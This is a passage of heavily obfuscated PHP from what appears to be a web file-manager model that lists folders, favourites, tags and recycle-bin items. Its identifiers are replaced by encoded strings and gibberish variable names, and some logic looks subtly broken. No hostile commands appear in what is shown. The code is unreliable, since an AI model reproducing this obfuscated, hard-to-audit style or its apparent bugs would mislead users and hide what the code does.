"\x66\165\x6e\x63\164\151\x6f\156"), array("\x63\x72\145\x61\x74\x65\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\165\156\143\x74\x69\x6f\156"), array("\166\x69\145\x77\x54\151\155\x65", "\164\151\x6d\x65", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ É¡÷›²) { return $this->listSource(array($_SERVER[¿ÈˆÑ¸ä][488] => $ É¡÷›²)); } public function typeName($Åª¥ø‚’) { static $àŒŠÔ¯Ì = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $àŒŠÔ¯Ì[$Åª¥ø‚’ . $_SERVER[¿ÈˆÑ¸ä][12]]; } public function sourceListInfo($»ç”ğõµ, $Ô‹Š¬ë¦ = false) { $è»…˜ =& $_SERVER[¿ÈˆÑ¸ä]; $»ç”ğõµ = $»ç”ğõµ ? $»ç”ğõµ : array(); $»ç”ğõµ = array_filter(array_unique($»ç”ğõµ)); if (!$»ç”ğõµ) { return array(); } $˜úæÙŠ• = $this->where(array($è»…˜[192] => array($è»…˜[7], $»ç”ğõµ)))->select(); $this->_listDataApply($˜úæÙŠ•, $Ô‹Š¬ë¦); return array_to_keyvalue($˜úæÙŠ•, $è»…˜[192]); } public function pathInfoFilter(&$´¨ù…Óé) { $ŸÖÛËıá =& $_SERVER[¿ÈˆÑ¸ä]; static $§—èÛÊ° = false; static $½©˜µÏª = false; static $Ñ­¶ìşœ = false; if (!$§—èÛÊ°) { $§ú§¹Í… = $ŸÖÛËıá[489]; $§ú§¹Í… .= $ŸÖÛËıá[490]; $§ú§¹Í… .= $ŸÖÛËıá[491]; $‡„Š³¤¿ = $ŸÖÛËıá[492]; $‰Áù¯‘˜ = explode($ŸÖÛËıá[50], $‡„Š³¤¿); $§—èÛÊ° = explode($ŸÖÛËıá[50], $§ú§¹Í…); $½©˜µÏª = array(); foreach ($§—èÛÊ° as $¯ÔÙâè) { if (in_array($¯ÔÙâè, $‰Áù¯‘˜)) { continue; } $½©˜µÏª[] = $¯ÔÙâè; } $Ñ­¶ìşœ = explode($ŸÖÛËıá[50], $ŸÖÛËıá[493]); } foreach ($Ñ­¶ìşœ as $Êãí«Ì) { if (isset($´¨ù…Óé[$Êãí«Ì])) { $´¨ù…Óé[$Êãí«Ì] = intval($´¨ù…Óé[$Êãí«Ì]); } } $´¨ù…Óé[$ŸÖÛËıá[87]] = $ŸÖÛËıá[494] . $´¨ù…Óé[$ŸÖÛËıá[192]] . $ŸÖÛËıá[495]; $´¨ù…Óé[$ŸÖÛËıá[33]] = $´¨ù…Óé[$ŸÖÛËıá[496]] == 1 ? $ŸÖÛËıá[78] : $ŸÖÛËıá[231]; $´¨ù…Óé[$ŸÖÛËıá[189]] = $this->typeName($´¨ù…Óé[$ŸÖÛËıá[189]]); if ($´¨ù…Óé[$ŸÖÛËıá[496]] != 1) { $´¨ù…Óé[$ŸÖÛËıá[167]] = $´¨ù…Óé[$ŸÖÛËıá[497]]; unset($´¨ù…Óé[$ŸÖÛËıá[497]]); } $ò´”Û¸¸ = $§—èÛÊ°; if (isset($´¨ù…Óé[$ŸÖÛËıá[498]]) && $´¨ù…Óé[$ŸÖÛËıá[498]][$ŸÖÛËıá[499]] == -1) { $ò´”Û¸¸ = $½©˜µÏª; } $´¨ù…Óé = array_field_key($´¨ù…Óé, $ò´”Û¸¸); return $´¨ù…Óé; } public function listUserFav() { $—Ö´ºÓş =& $_SERVER[¿ÈˆÑ¸ä]; $Ì°öàç¨ = Model($—Ö´ºÓş[500])->listData(); $ôŞñ¶®é = array_filter_by_field($Ì°öàç¨, $—Ö´ºÓş[33], $—Ö´ºÓş[501]); $ôŞñ¶®é = array_to_keyvalue($ôŞñ¶®é, $—Ö´ºÓş[12], $—Ö´ºÓş[87]); if ($ôŞñ¶®é) { $ø†½š = $this->listSource(array($—Ö´ºÓş[502] => array($—Ö´ºÓş[503], $ôŞñ¶®é))); } $ø†½š = array_to_keyvalue($ø†½š[$—Ö´ºÓş[446]], $—Ö´ºÓş[192]); foreach ($Ì°öàç¨ as &$ëßÊì™‰) { $ëßÊì™‰ = array($—Ö´ºÓş[504] => $ëßÊì™‰[$—Ö´ºÓş[483]], $—Ö´ºÓş[505] => $ëßÊì™‰[$—Ö´ºÓş[32]], $—Ö´ºÓş[506] => $ëßÊì™‰[$—Ö´ºÓş[87]], $—Ö´ºÓş[507] => $ëßÊì™‰[$—Ö´ºÓş[33]], $—Ö´ºÓş[508] => $ëßÊì™‰[$—Ö´ºÓş[232]], $—Ö´ºÓş[509] => $ëßÊì™‰[$—Ö´ºÓş[88]]); if ($ëßÊì™‰[$—Ö´ºÓş[33]] == $—Ö´ºÓş[501] && $ø†½š[$ëßÊì™‰[$—Ö´ºÓş[87]]]) { $ëßÊì™‰[$—Ö´ºÓş[90]] = $ø†½š[$ëßÊì™‰[$—Ö´ºÓş[87]]]; } } unset($ëßÊì™‰); return $Ì°öàç¨; } public function listUserTag($‚ƒ÷÷) { $Ëö±Ä„é =& $_SERVER[¿ÈˆÑ¸ä]; if ($‚ƒ÷÷ && !is_array($‚ƒ÷÷)) { $‚ƒ÷÷ = array($‚ƒ÷÷); } $Ü­ƒ¦‹ = Model($Ëö±Ä„é[510])->listData(); $õšÌƒ = array(); $©âŞ†Îé = array(); foreach ($Ü­ƒ¦‹ as $÷Â÷²†ğ) { $Ü®‘­á° = $÷Â÷²†ğ[$Ëö±Ä„é[87]]; if (!$Ü®‘­á°) { continue; } if (!isset($©âŞ†Îé[$Ü®‘­á°])) { $©âŞ†Îé[$Ü®‘­á°] = array(); } $©âŞ†Îé[$Ü®‘­á°][] = $÷Â÷²†ğ[$Ëö±Ä„é[511]]; $õšÌƒ[$÷Â÷²†ğ[$Ëö±Ä„é[87]]] = $÷Â÷²†ğ; } $ö¤ßé™ô = array(); $‰˜•Ÿğ€ = array(); $ô€Ÿ÷ÛÏ = array(); foreach ($©âŞ†Îé as $í€œĞùì => $ïğÏÄšŒ) { $ı¸³Ê¼ = !0; if (!$‚ƒ÷÷) { $ö¤ßé™ô[] = $í€œĞùì; continue; } foreach ($‚ƒ÷÷ as $æÆ—Ò««) { if (!in_array($æÆ—Ò««, $ïğÏÄšŒ)) { $ı¸³Ê¼ = !1; break; } } if (!$ı¸³Ê¼) { continue; } if (!is_numeric($í€œĞùì)) { $Å‡‰‡ŒÔ = $õšÌƒ[$í€œĞùì]; $êİ¾õ¬Ó = array($Ëö±Ä„é[32] => $Å‡‰‡ŒÔ[$Ëö±Ä„é[32]], $Ëö±Ä„é[87] => $Å‡‰‡ŒÔ[$Ëö±Ä„é[87]], $Ëö±Ä„é[33] => $Å‡‰‡ŒÔ[$Ëö±Ä„é[33]], $Ëö±Ä„é[90] => array($Ëö±Ä„é[512] => 1), $Ëö±Ä„é[233] => !0); if ($Å‡‰‡ŒÔ[$Ëö±Ä„é[33]] == $Ëö±Ä„é[231]) { $ô€Ÿ÷ÛÏ[] = $êİ¾õ¬Ó; } if ($Å‡‰‡ŒÔ[$Ëö±Ä„é[33]] == $Ëö±Ä„é[78]) { $‰˜•Ÿğ€[] = $êİ¾õ¬Ó; } continue; } $ö¤ßé™ô[] = $í€œĞùì; } if ($ö¤ßé™ô) { $ÇÉÀÅ¾è = $this->listSource(array($Ëö±Ä„é[502] => array($Ëö±Ä„é[503], $ö¤ßé™ô))); } $ÇÉÀÅ¾è = $ÇÉÀÅ¾è ? $ÇÉÀÅ¾è : array($Ëö±Ä„é[85] => array(), $Ëö±Ä„é[86] => array()); $ÇÉÀÅ¾è[$Ëö±Ä„é[85]] = array_merge($ÇÉÀÅ¾è[$Ëö±Ä„é[85]], $‰˜•Ÿğ€); $ÇÉÀÅ¾è[$Ëö±Ä„é[86]] = array_merge($ÇÉÀÅ¾è[$Ëö±Ä„é[86]], $ô€Ÿ÷ÛÏ); if (isset($ÇÉÀÅ¾è[$Ëö±Ä„é[443]]) && count($ö¤ßé™ô) == $ÇÉÀÅ¾è[$Ëö±Ä„é[443]][$Ëö±Ä„é[444]]) { return $ÇÉÀÅ¾è; } $á¹Ûõ£ = array(); $ùúş°» = array_to_keyvalue($ÇÉÀÅ¾è[$Ëö±Ä„é[85]], $Ëö±Ä„é[12], $Ëö±Ä„é[192]); $À¿–Î¸¾ = array_to_keyvalue($ÇÉÀÅ¾è[$Ëö±Ä„é[86]], $Ëö±Ä„é[12], $Ëö±Ä„é[192]); $â—“˜·Ø = array_merge($À¿–Î¸¾, $ùúş°»); foreach ($ö¤ßé™ô as $Ü®‘­á°) { if (!in_array($Ü®‘­á°, $â—“˜·Ø)) { $á¹Ûõ£[] = $Ü®‘­á°; } } if ($á¹Ûõ£) { Model($Ëö±Ä„é[513])->removeBySource($á¹Ûõ£); } return $ÇÉÀÅ¾è; } public function listUserRecycle() { $ÌñşËÛ =& $_SERVER[¿ÈˆÑ¸ä]; $¡Áş´ÀÈ = Model($ÌñşËÛ[514])->listData(); if (!$¡Áş´ÀÈ) { return array(); } $¿Ãê†Éô = array($ÌñşËÛ[502] => array($ÌñşËÛ[503], $¡Áş´ÀÈ), $ÌñşËÛ[515] => 1); return $this->listSource($¿Ãê†Éô); } public function listSource($úÒ§Ñ¤—, $ÑÈ…ˆÌ— = 3000, $ÕÄÆ£ë¢ = false) { $º±´‡äÙ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($úÒ§Ñ¤—[$º±´‡äÙ[516]])) { $úÒ§Ñ¤—[$º±´‡äÙ[516]] = 0; } if (isset($úÒ§Ñ¤—[$º±´‡äÙ[191]]) && $úÒ§Ñ¤—[$º±´‡äÙ[191]] == $º±´‡äÙ[229]) { $úÒ§Ñ¤—[$º±´‡äÙ[497]] = array($º±´‡äÙ[464], $º±´‡äÙ[12]); } if (isset($úÒ§Ñ¤—[$º±´‡äÙ[191]])) { $úÒ§Ñ¤—[$º±´‡äÙ[191]] = intval($úÒ§Ñ¤—[$º±´‡äÙ[191]]); } $ù’ŒÄˆ = $º±´‡äÙ[517]; $™ó¢ÉÑ = $this->field($ù’ŒÄˆ)->_makeOrder()->where($úÒ§Ñ¤—)->selectPage($ÑÈ…ˆÌ—); $this->_listPageCheck($™ó¢ÉÑ, $ù’ŒÄˆ, $úÒ§Ñ¤—); $this->_listDataApply($™ó¢ÉÑ[$º±´‡äÙ[446]], $ÕÄÆ£ë¢); $this->_listMake($™ó¢ÉÑ); return $™ó¢ÉÑ; } private function _listPageCheck(&$¥¶ÑØ§Ù, $ïòÛ»Ö÷, $Îñå¡¨¨) { $©ºÍâµˆ =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($¥¶ÑØ§Ù[$©ºÍâµˆ[443]])) { return; } $²ÜÜüâ = $¥¶ÑØ§Ù[$©ºÍâµˆ[443]]; if ($²ÜÜüâ[$©ºÍâµˆ[445]] <= 1) { return; } if ($²ÜÜüâ[$©ºÍâµˆ[444]] >= 100000) { return; } if (Model($©ºÍâµˆ[518])->get($©ºÍâµˆ[519]) != $©ºÍâµˆ[520]) { return; } $ïòÛ»Ö÷ = str_replace(array($©ºÍâµˆ[53], $©ºÍâµˆ[418], $©ºÍâµˆ[286]), $©ºÍâµˆ[12], $ïòÛ»Ö÷); $ïòÛ»Ö÷ = $©ºÍâµˆ[521] . str_replace($©ºÍâµˆ[50], $©ºÍâµˆ[522], $ïòÛ»Ö÷) . $©ºÍâµˆ[523]; $Éñ‹•Š = $©ºÍâµˆ[524]; $Éñ‹•Š = $Éñ‹•Š . $©ºÍâµˆ[525]; $ÂÜÆ×Õ¨ = $²ÜÜüâ[$©ºÍâµˆ[440]] * ($²ÜÜüâ[$©ºÍâµˆ[429]] - 1) . $©ºÍâµˆ[50] . $²ÜÜüâ[$©ºÍâµˆ[440]]; $¢ã´¼èñ = $this->_makeOrder(!0); $…Ì¬üƒ¶ = $©ºÍâµˆ[521] . str_replace($©ºÍâµˆ[50], $©ºÍâµˆ[522], $¢ã´¼èñ[0]); if (strpos($…Ì¬üƒ¶, $©ºÍâµˆ[526])) { $…Ì¬üƒ¶ = str_replace($©ºÍâµˆ[526], $©ºÍâµˆ[527], $…Ì¬üƒ¶); } else { $…Ì¬üƒ¶ .= $©ºÍâµˆ[528] . $¢ã´¼èñ[1]; } $ÍãÃ¹È– = array(); foreach ($Îñå¡¨¨ as $Ö·Ã³© => $Óâ£µËŒ) { $ÍãÃ¹È–[$©ºÍâµˆ[521] . $Ö·Ã³©] = $Óâ£µËŒ; } $this->alias($©ºÍâµˆ[529])->field($ïòÛ»Ö÷)->limit($ÂÜÆ×Õ¨)->order($…Ì¬üƒ¶); $±ñ¦º†¯ = $this->join($Éñ‹•Š)->where($ÍãÃ¹È–)->select(); if ($±ñ¦º†¯) { $¥¶ÑØ§Ù[$©ºÍâµˆ[446]] = $±ñ¦º†¯; } } protected function _makeOrder($íŒİĞ“º = false) { $™Ÿ°î =& $_SERVER[¿ÈˆÑ¸ä]; $³®³™ÄÂ = Model($™Ÿ°î[530])->get($™Ÿ°î[531]); $ê¢Ù‡½¬ = Model($™Ÿ°î[530])->get($™Ÿ°î[532]); $õ¤İÁĞ‹ = array($™Ÿ°î[533] => $™Ÿ°î[534], $™Ÿ°î[535] => $™Ÿ°î[536]); $øÌ¬ûİ‘ = array($™Ÿ°î[32] => $™Ÿ°î[32], $™Ÿ°î[79] => $™Ÿ°î[79], $™Ÿ°î[167] => $™Ÿ°î[497], $™Ÿ°î[537] => $™Ÿ°î[537], $™Ÿ°î[538] => $™Ÿ°î[539], $™Ÿ°î[232] => $™Ÿ°î[232], $™Ÿ°î[88] => $™Ÿ°î[88]); $ªì¡À–‘ = Input::get($™Ÿ°î[540], $™Ÿ°î[7], $³®³™ÄÂ, array_keys($øÌ¬ûİ‘)); $ÒÇ½ö„  = Input::get($™Ÿ°î[541], $™Ÿ°î[7], $ê¢Ù‡½¬, array_keys($õ¤İÁĞ‹)); if (!in_array($ªì¡À–‘, array_keys($øÌ¬ûİ‘))) { $ªì¡À–‘ = $™Ÿ°î[32]; } if (!in_array($ÒÇ½ö„ , array_keys($õ¤İÁĞ‹))) { $ªì¡À–‘ = $™Ÿ°î[533]; } if ($ªì¡À–‘ == $™Ÿ°î[32]) { } $æ±Ğ—ñ = $™Ÿ°î[542] . $øÌ¬ûİ‘[$ªì¡À–‘] . $™Ÿ°î[53] . $õ¤İÁĞ‹[$ÒÇ½ö„ ]; $æ±Ğ—ñ = rtrim(trim($æ±Ğ—ñ), $™Ÿ°î[50]); if ($íŒİĞ“º) { return array($æ±Ğ—ñ, $õ¤İÁĞ‹[$ÒÇ½ö„ ]); } return $this->order($æ±Ğ—ñ); } protected function _listDataApplyItem($ØŞˆïˆ, $ŒÒ¨î—¡ = false) { $¦ŞãØ¾¢ = array($ØŞˆïˆ); $this->_listDataApply($¦ŞãØ¾¢, $ŒÒ¨î—¡); return $¦ŞãØ¾¢[0]; } protected function _listDataApply(&$îöµé»û, $ÀÏçè‘Ø = false) { $ÇÜüª›ì =& $_SERVER[¿ÈˆÑ¸ä]; if (!$îöµé»û) { $îöµé»û = array(); return; } $ÊèãÛ¤Â = array_to_keyvalue($îöµé»û, $ÇÜüª›ì[12], $ÇÜüª›ì[192]); $ÊèãÛ¤Â = array_unique($ÊèãÛ¤Â); $ÊèãÛ¤Â = array_to_int($ÊèãÛ¤Â); $this->_listSourceCache($îöµé»û); if (!$ÀÏçè‘Ø) { $this->_listAppendMeta($îöµé»û, $ÊèãÛ¤Â); $this->_listAppendFileMeta($îöµé»û, $ÊèãÛ¤Â); $this->_listAppendChildren($îöµé»û, $ÊèãÛ¤Â); } $this->_listAppendPath($îöµé»û); $this->_listAppendAuth($îöµé»û); $this->_listAppendSourceInfo($îöµé»û, $ÊèãÛ¤Â); $this->_listAppendUser($îöµé»û); $this->_listFilterInfo($îöµé»û, $ÀÏçè‘Ø); $this->_listAppendAuthSecret($îöµé»û); } protected function _listSourceCache($âçÈêåÀ) { $©³ïœß =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($âçÈêåÀ as $Ö¡ÀúÖ) { self::$cacheSourceInfo[$©³ïœß[543] . $Ö¡ÀúÖ[$©³ïœß[192]]] = $Ö¡ÀúÖ; } } protected function _listFilterInfo(&$‡‹å¤Å‘, $îø×¾³ = false) { $Ü²»ŠÈ =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($‡‹å¤Å‘ as &$±õİ²ğŸ) { $±õİ²ğŸ = $this->pathInfoFilter($±õİ²ğŸ); self::$cachePathInfo[$Ü²»ŠÈ[544] . intval($îø×¾³) . $Ü²»ŠÈ[473] . $±õİ²ğŸ[$Ü²»ŠÈ[192]]] = $±õİ²ğŸ; } unset($±õİ²ğŸ); } protected function _listMake(&$ôÔÒÜä¥) { $çÔ‰¦õ =& $_SERVER[¿ÈˆÑ¸ä]; $ôÔÒÜä¥[$çÔ‰¦õ[85]] = array(); $ôÔÒÜä¥[$çÔ‰¦õ[86]] = array(); foreach ($ôÔÒÜä¥[$çÔ‰¦õ[446]] as $’ìË³¬±) { $¦áŸüÔ = $’ìË³¬±[$çÔ‰¦õ[496]] == 1 ? $çÔ‰¦õ[85] : $çÔ‰¦õ[86]; $ôÔÒÜä¥[$¦áŸüÔ][] = $’ìË³¬±; } unset($ôÔÒÜä¥[$çÔ‰¦õ[446]]); } protected function _listAppendMeta(&$¨ïõ­ë“, $Ûàƒ½–) { $®ÌØÙİ€ =& $_SERVER[¿ÈˆÑ¸ä]; $Ãä½Ø = array($®ÌØÙİ€[502] => array($®ÌØÙİ€[503], $Ûàƒ½–)); $ÉÈŞşğ = Model($®ÌØÙİ€[545])->field($®ÌØÙİ€[546])->where($Ãä½Ø)->select(); if (!$ÉÈŞşğ) { return; } $±úŠª§ó = array($®ÌØÙİ€[547], $®ÌØÙİ€[548], $®ÌØÙİ€[527]); $È±ß“´ = array(); foreach ($ÉÈŞşğ as $ë¯è¾³Ç) { if (!isset($È±ß“´[$ë¯è¾³Ç[$®ÌØÙİ€[192]]])) { $È±ß“´[$ë¯è¾³Ç[$®ÌØÙİ€[192]]] = array(); } if (in_array($ë¯è¾³Ç[$®ÌØÙİ€[95]], $±úŠª§ó)) { continue; } if ($ë¯è¾³Ç[$®ÌØÙİ€[95]] == $®ÌØÙİ€[549]) { $ë¯è¾³Ç[$®ÌØÙİ€[451]] = $®ÌØÙİ€[550]; } $È±ß“´[$ë¯è¾³Ç[$®ÌØÙİ€[192]]][$ë¯è¾³Ç[$®ÌØÙİ€[95]]] = $ë¯è¾³Ç[$®ÌØÙİ€[451]]; } foreach ($¨ïõ­ë“ as &$§‚˜´ì†) { $§‚˜´ì†[$®ÌØÙİ€[551]] = !1; if (isset($È±ß“´[$§‚˜´ì†[$®ÌØÙİ€[192]]])) { $§‚˜´ì†[$®ÌØÙİ€[551]] = $È±ß“´[$§‚˜´ì†[$®ÌØÙİ€[192]]]; } if ($this->fileIsLock($§‚˜´ì†) && $§‚˜´ì†[$®ÌØÙİ€[498]]) { $ª¦Ÿ¤± = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $§‚˜´ì†[$®ÌØÙİ€[498]][$®ÌØÙİ€[499]] = AuthModel::authDisable($§‚˜´ì†[$®ÌØÙİ€[498]][$®ÌØÙİ€[499]], $ª¦Ÿ¤±); $§‚˜´ì†[$®ÌØÙİ€[498]][$®ÌØÙİ€[552]][$®ÌØÙİ€[498]] = $§‚˜´ì†[$®ÌØÙİ€[498]][$®ÌØÙİ€[499]]; } } unset($§‚˜´ì†); } protected function _listAppendFileMeta(&$Õà’ù—æ, $¾Ó³¡ä) { $Á‡Ç‹Øº =& $_SERVER[¿ÈˆÑ¸ä]; $ÒÄòÎÏª = array_to_keyvalue($Õà’ù—æ, $Á‡Ç‹Øº[12], $Á‡Ç‹Øº[553]); $ÒÄòÎÏª = array_filter(array_unique($ÒÄòÎÏª)); $ÒÄòÎÏª = array_to_int($ÒÄòÎÏª); if (!$ÒÄòÎÏª) { return; } $’ß“²´ = array($Á‡Ç‹Øº[554] => array($Á‡Ç‹Øº[503], $ÒÄòÎÏª)); $£”äğ‚ô = $Á‡Ç‹Øº[555]; $Â”ü© ò = Model($Á‡Ç‹Øº[556])->field($£”äğ‚ô)->where($’ß“²´)->select(); $Â”ü© ò = array_to_keyvalue($Â”ü© ò, $Á‡Ç‹Øº[553]); $ÏÏ²¯ã = Model($Á‡Ç‹Øº[557])->field($Á‡Ç‹Øº[558])->where($’ß“²´)->select(); $ÏÏ²¯ã = $ÏÏ²¯ã ? $ÏÏ²¯ã : array(); $¢ÖÅ¥ÀÄ = array(); foreach ($ÏÏ²¯ã as $¤‚ôã´¥) { if (!isset($¢ÖÅ¥ÀÄ[$¤‚ôã´¥[$Á‡Ç‹Øº[553]]])) { $¢ÖÅ¥ÀÄ[$¤‚ôã´¥[$Á‡Ç‹Øº[553]]] = array(); } $¢ÖÅ¥ÀÄ[$¤‚ôã´¥[$Á‡Ç‹Øº[553]]][$¤‚ôã´¥[$Á‡Ç‹Øº[95]]] = $¤‚ôã´¥[$Á‡Ç‹Øº[451]]; } foreach ($Õà’ù—æ as &$‘«™ĞîÉ) { $ÔÍùÜˆ¿ = $‘«™ĞîÉ[$Á‡Ç‹Øº[553]]; if (!$ÔÍùÜˆ¿ || !is_array($Â”ü© ò[$ÔÍùÜˆ¿])) { continue; } $¿·€‘äÉ = $Â”ü© ò[$ÔÍùÜˆ¿]; $¿·€‘äÉ[$Á‡Ç‹Øº[79]] = $‘«™ĞîÉ[$Á‡Ç‹Øº[79]]; $¿·€‘äÉ[$Á‡Ç‹Øº[32]] = $‘«™ĞîÉ[$Á‡Ç‹Øº[32]]; if (!$¿·€‘äÉ[$Á‡Ç‹Øº[559]]) { Model($Á‡Ç‹Øº[556])->fileMd5Check($¿·€‘äÉ); } if (!isset(self::$cacheFileInfo[$Á‡Ç‹Øº[560] . $ÔÍùÜˆ¿])) { self::$cacheFileInfo[$Á‡Ç‹Øº[560] . $ÔÍùÜˆ¿] = array_merge(array(), $¿·€‘äÉ); } unset($Â”ü© ò[$ÔÍùÜˆ¿][$Á‡Ç‹Øº[87]]); $ß¢‘÷¡ = isset($¢ÖÅ¥ÀÄ[$ÔÍùÜˆ¿]) && is_array($¢ÖÅ¥ÀÄ[$ÔÍùÜˆ¿]) ? $¢ÖÅ¥ÀÄ[$ÔÍùÜˆ¿] : array(); $‘«™ĞîÉ[$Á‡Ç‹Øº[168]] = array_merge($ß¢‘÷¡, $Â”ü© ò[$ÔÍùÜˆ¿]); if (isset($‘«™ĞîÉ[$Á‡Ç‹Øº[168]][$Á‡Ç‹Øº[183]])) { $‘«™ĞîÉ[$Á‡Ç‹Øº[183]] = json_decode($‘«™ĞîÉ[$Á‡Ç‹Øº[168]][$Á‡Ç‹Øº[183]], !0); unset($‘«™ĞîÉ[$Á‡Ç‹Øº[168]][$Á‡Ç‹Øº[183]]); } } unset($‘«™ĞîÉ); } protected function _listAppendSourceInfo(&$§‡‰ÀøŒ, $Õø¼íâŒ) { $‡²€ĞÌˆ =& $_SERVER[¿ÈˆÑ¸ä]; $ò­ËÔ°Æ = Model($‡²€ĞÌˆ[561])->listData(); $Åéá• = Model($‡²€ĞÌˆ[510])->listData(); $‘Ô¯ä = Model($‡²€ĞÌˆ[500])->listData(); $”äèÍ¨ù = Model($‡²€ĞÌˆ[562])->listSimple(); $û—«…´ = array_to_keyvalue($ò­ËÔ°Æ, $‡²€ĞÌˆ[483]); $ùÎ—Ğ¿ = array_to_keyvalue_group($Åéá•, $‡²€ĞÌˆ[87], $‡²€ĞÌˆ[511]); $È©Ò”ÍÁ = array_to_keyvalue($‘Ô¯ä, $‡²€ĞÌˆ[87]); $Ÿ®¹‹Òş = array_to_keyvalue_group($”äèÍ¨ù, $‡²€ĞÌˆ[192]); foreach ($§‡‰ÀøŒ as &$èßÚ­è±) { $èßÚ­è±[$‡²€ĞÌˆ[90]] = array($‡²€ĞÌˆ[563] => 0, $‡²€ĞÌˆ[564] => 0, $‡²€ĞÌˆ[565] => 0); if (isset($È©Ò”ÍÁ[$èßÚ­è±[$‡²€ĞÌˆ[192]]])) { $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[566]] = 1; $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[567]] = $È©Ò”ÍÁ[$èßÚ­è±[$‡²€ĞÌˆ[192]]][$‡²€ĞÌˆ[32]]; } if ($ùÎ—Ğ¿ && $û—«…´ && isset($ùÎ—Ğ¿[$èßÚ­è±[$‡²€ĞÌˆ[192]]])) { $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[568]] = array(); foreach ($ùÎ—Ğ¿[$èßÚ­è±[$‡²€ĞÌˆ[192]]] as $ûŒ“ÚÓ) { $‚¯ŠÌ‚ = $û—«…´[$ûŒ“ÚÓ]; $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[568]][] = array($‡²€ĞÌˆ[569] => $‚¯ŠÌ‚[$‡²€ĞÌˆ[483]], $‡²€ĞÌˆ[505] => $‚¯ŠÌ‚[$‡²€ĞÌˆ[32]], $‡²€ĞÌˆ[570] => $‚¯ŠÌ‚[$‡²€ĞÌˆ[571]]); } } if ($Ÿ®¹‹Òş && isset($Ÿ®¹‹Òş[$èßÚ­è±[$‡²€ĞÌˆ[192]]])) { $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[572]] = array(); foreach ($Ÿ®¹‹Òş[$èßÚ­è±[$‡²€ĞÌˆ[192]]] as $¦üÍü) { $èßÚ­è±[$‡²€ĞÌˆ[90]][$‡²€ĞÌˆ[572]] = $this->shareFilterShow($¦üÍü); } } } unset($èßÚ­è±); return $§‡‰ÀøŒ; } protected function shareFilterShow($ş™¬Èë) { $Ï™…áÚ‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ş™¬Èë) { return $ş™¬Èë; } $İæä÷ëÜ = $Ï™…áÚ‡[573]; if ($ş™¬Èë[$Ï™…áÚ‡[574]] == $Ï™…áÚ‡[91]) { $İæä÷ëÜ .= $Ï™…áÚ‡[575]; } if (is_array($ş™¬Èë[$Ï™…áÚ‡[576]]) && is_array($ş™¬Èë[$Ï™…áÚ‡[576]][$Ï™…áÚ‡[577]])) { $ş™¬Èë[$Ï™…áÚ‡[576]][$Ï™…áÚ‡[577]] = $Ï™…áÚ‡[578]; } if (!$ë£•ƒõİ[$Ï™…áÚ‡[579]] && $ë£•ƒõİ[$Ï™…áÚ‡[192]] != $Ï™…áÚ‡[229]) { $ë£•ƒõİ[$Ï™…áÚ‡[579]] = KodIO::make($ë£•ƒõİ[$Ï™…áÚ‡[192]]); } $ş™¬Èë = array_field_key($ş™¬Èë, explode($Ï™…áÚ‡[50], $İæä÷ëÜ)); return $ş™¬Èë; } protected function _listAppendChildren(&$ÏÁ™¢é, $‹ğğ×ÂÔ) { $¾¿äûÀ© =& $_SERVER[¿ÈˆÑ¸ä]; $Š«÷Ò± = array(); $ºäçó¡å = array($¾¿äûÀ©[240] => 0, $¾¿äûÀ©[241] => 0); foreach ($ÏÁ™¢é as &$šûºò‘) { if (!$šûºò‘[$¾¿äûÀ©[496]]) { continue; } $Š«÷Ò±[] = intval($šûºò‘[$¾¿äûÀ©[192]]); } unset($šûºò‘); if (!$Š«÷Ò±) { return; } $ç’—‡ŸÅ = array($¾¿äûÀ©[191] => array($¾¿äûÀ©[7], $Š«÷Ò±), $¾¿äûÀ©[516] => 0); $“••ß…ô = array($¾¿äûÀ©[191], $¾¿äûÀ©[496], $¾¿äûÀ©[580] => $¾¿äûÀ©[581]); $ƒ»ºØ†Ã = $this->field($“••ß…ô)->where($ç’—‡ŸÅ)->group($¾¿äûÀ©[582])->select(); $–â±ç£ú = array(); foreach ($ƒ»ºØ†Ã as $›³àĞí˜) { $šª¸»üô = $›³àĞí˜[$¾¿äûÀ©[191]]; $ùı±ÆÆÅ = $›³àĞí˜[$¾¿äûÀ©[496]] == $¾¿äûÀ©[91] ? $¾¿äûÀ©[241] : $¾¿äûÀ©[240]; if (!isset($–â±ç£ú[$šª¸»üô])) { $–â±ç£ú[$šª¸»üô] = array($¾¿äûÀ©[240] => 0, $¾¿äûÀ©[241] => 0); } $–â±ç£ú[$šª¸»üô][$ùı±ÆÆÅ] += $›³àĞí˜[$¾¿äûÀ©[581]]; } foreach ($ÏÁ™¢é as &$šûºò‘) { if (!$šûºò‘[$¾¿äûÀ©[496]]) { continue; } $ıÇ¯˜§º = is_array($–â±ç£ú[$šûºò‘[$¾¿äûÀ©[192]]]) ? $–â±ç£ú[$šûºò‘[$¾¿äûÀ©[192]]] : $ºäçó¡å; $šûºò‘[$¾¿äûÀ©[241]] = $ıÇ¯˜§º[$¾¿äûÀ©[241]]; $šûºò‘[$¾¿äûÀ©[240]] = $ıÇ¯˜§º[$¾¿äûÀ©[240]]; unset($šûºò‘[$¾¿äûÀ©[497]]); } unset($šûºò‘); } protected function _listAppendAuth(&$šİÄîæ¶) { $©··€í =& $_SERVER[¿ÈˆÑ¸ä]; $æêáÊÓ = array(); foreach ($šİÄîæ¶ as $ä€‘¿ªú) { if ($ä€‘¿ªú[$©··€í[189]] == self::TYPE_GROUP) { $æêáÊÓ[] = intval($ä€‘¿ªú[$©··€í[192]]); } } if (!$æêáÊÓ) { return; } 